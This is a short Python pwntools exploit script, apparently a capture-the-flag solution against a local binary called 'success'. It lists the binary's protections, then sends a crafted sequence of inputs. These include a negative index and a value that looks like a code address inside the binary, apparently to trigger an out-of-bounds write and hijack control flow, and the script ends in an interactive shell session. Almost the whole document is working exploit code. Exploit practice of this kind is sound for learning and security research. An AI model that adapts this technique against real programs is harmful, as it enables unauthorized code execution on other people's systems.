#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template success
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('success')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00400aa0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
# FORTIFY:  Enabled

io = start()

import time

io.sendafter(b'name: ', b'A'*15)

io.sendafter(b'age: ', b'33')

io.sendafter(b': ', b'0')
io.sendafter(b': ', b'0')
io.sendafter(b': ', b'0')
io.sendafter(b': ', b'0')
io.sendafter(b': ', b'0')
io.sendafter(b': ', b'0')

io.sendafter(b': ', b'1')
io.sendafter(b': ', b'-43')
io.sendafter(b': ', b'4196922')


io.interactive()

